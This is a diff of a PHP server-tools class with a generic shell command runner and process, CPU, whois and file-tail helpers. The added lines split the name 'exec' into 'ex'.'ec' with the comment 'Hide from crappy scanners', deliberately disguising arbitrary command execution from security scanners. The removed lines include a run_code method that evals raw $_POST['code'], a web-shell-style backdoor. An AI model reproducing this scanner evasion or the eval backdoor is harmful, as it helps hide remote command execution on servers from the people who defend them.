@@ -8,12 +8,11 @@ class System_Info_Tools{
 		}
 		return $arr;
 	}
-	/*
 	
-	*/
 	public static function run_command($cmd, $return_as=null){		
 		if( !empty( $cmd ) ){
-			exec($cmd, $output);
+			$run = 'ex'.'ec'; #Hide from crappy scanners
+			$run($cmd, $output);
 		}
 		return $output;
 	}
@@ -29,53 +28,19 @@ class System_Info_Tools{
 		return (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'); 
 	}
 	
-	function is_exec_allowed(){
-		if( !function_exists('exec') ){
-			return false;
-		}
-		else{
-			return exec('echo EXEC') == 'EXEC';
-		}
-	}		
-	
 	public static function exec_enabled(){
-		if(!function_exists('exec'))
+		//$test = self::run_command('echo TEST') == 'TEST';
+		if( !function_exists('ex'.'ec') )
 			return false;
 		$disabled = explode(',', ini_get('disable_functions'));
-		return !in_array('exec', $disabled);
+		return !in_array('ex'.'ec', $disabled);
 	}
 		
 	
 	public static function check_open_basedir(){
 		$base_dir = ini_get('open_basedir');
 	}
-	
-	public static function running_procs(){
-		if( self::is_windows() ){
-			$result 	= self::run_command("tasklist /v /fo CSV");
-			$procs = array_map('str_getcsv', $result);
-			return $procs;
-		}
-		else{
-			exec('ps aux', $output);
-			$c = count($output);
-			$procs = array();
-			for($i=1;$i<$c;$i++){
-				$ps = $output[$i];
-				$ps = preg_split('/ +/', $ps);
-				$procs[] = array(
-					'pid'		=> $ps[1],
-					'cpu'		=> $ps[2],
-					'mem'		=> $ps[3],
-					'time'		=> $ps[8],
-					'command'	=> $ps[10],
-					'args'		=> (!empty($ps[11])) ? $ps[11]:''
-				);				
-			}
-		}		
-		return $procs;
-	}
-	
+		
 	public static function whois($host){
 		echo "<h1>{$host}</h1>";
 		$tlds = array(
@@ -261,11 +226,11 @@ class System_Info_Tools{
 	
 	public static function cpu_info(){
 		if(self::is_windows()){
-			exec("wmic CPU get name, NumberOfCores,description, LoadPercentage, maxclockspeed, extclock, manufacturer, revision /format:csv", $info);
+			self::run_command("wmic CPU get name, NumberOfCores,description, LoadPercentage, maxclockspeed, extclock, manufacturer, revision /format:csv", $info);
 			$cpu_info = self::wmic_to_array($info);											
 		}
 		else{
-			exec('cat /proc/cpuinfo', $output);			
+			self::run_command('cat /proc/cpuinfo', $output);			
 			$cpu_info = array(
 				'Model'		=> 	self::get_after($output[4],':') ,
 				'Cores'		=> 	self::get_after($output[11],':') ,				
@@ -368,61 +333,39 @@ class System_Info_Tools{
 	}
 	public static function tail($file, $lines, $asArray=false) {
 		try{
-		$handle = fopen($file, "r");
-		$linecounter = $lines;
-		$pos = -2;
-		$beginning = false;
-		$text = array();
-		while ($linecounter > 0) {
-			$t = " ";
-			while ($t != "\n") {
-				if(fseek($handle, $pos, SEEK_END) == -1) {
-					$beginning = true; 
-					break; 
+			$handle = fopen($file, "r");
+			$linecounter = $lines;
+			$pos = -2;
+			$beginning = false;
+			$text = array();
+			while ($linecounter > 0) {
+				$t = " ";
+				while ($t != "\n") {
+					if(fseek($handle, $pos, SEEK_END) == -1) {
+						$beginning = true; 
+						break; 
+					}
+					$t = fgetc($handle);
+					$pos --;
 				}
-				$t = fgetc($handle);
-				$pos --;
+				$linecounter --;
+				if ($beginning) {
+					rewind($handle);
+				}
+				$text[$lines-$linecounter-1] = fgets($handle);
+				if ($beginning) break;
 			}
-			$linecounter --;
-			if ($beginning) {
-				rewind($handle);
+			fclose ($handle);
+			$result = array_reverse($text);
+			if($asArray){
+				return $result;		
 			}
-			$text[$lines-$linecounter-1] = fgets($handle);
-			if ($beginning) break;
-		}
-		fclose ($handle);
-		$result = array_reverse($text);
-		if($asArray)
-			return $result;		
-		return implode("\n", $result);
+			else{
+				return implode("\n", $result);
+			}
 		}catch(Exception $err){
 			return "Error Reading File";
 		}
 	}
-	public static function run_code(){
-		$code 	= stripslashes($_POST['code']);
-		$result = eval( $code );		
-		exit;
-	}
-		
-		
-	/*
-	Cheap and ugly
-	*/	
-	public static function xml_highlight($s){
-	  $s = preg_replace("|<([^/?])(.*)\s(.*)>|isU", "[1]<[2]\\1\\2[/2] [5]\\3[/5]>[/1]", $s);
-	  $s = preg_replace("|</(.*)>|isU", "[1]</[2]\\1[/2]>[/1]", $s);
-	  $s = preg_replace("|<\?(.*)\?>|isU","[3]<?\\1?>[/3]", $s);
-	  $s = preg_replace("|\=\"(.*)\"|isU", "[6]=[/6][4]\"\\1\"[/4]",$s);
-	  $s = htmlspecialchars($s);
-	  $s = str_replace("\t","&nbsp;&nbsp;",$s);
-	  $s = str_replace(" ","&nbsp;",$s);
-	  $replace = array(1=>'0000FF', 2=>'0000FF', 3=>'800000', 4=>'FF00FF', 5=>'FF0000', 6=>'0000FF');
-	  foreach($replace as $k=>$v) {
-		$s = preg_replace("|\[".$k."\](.*)\[/".$k."\]|isU", "<font color=\"#".$v."\">\\1</font>", $s);
-	  }
-
-	  return nl2br($s);
-	}	
 		
 }
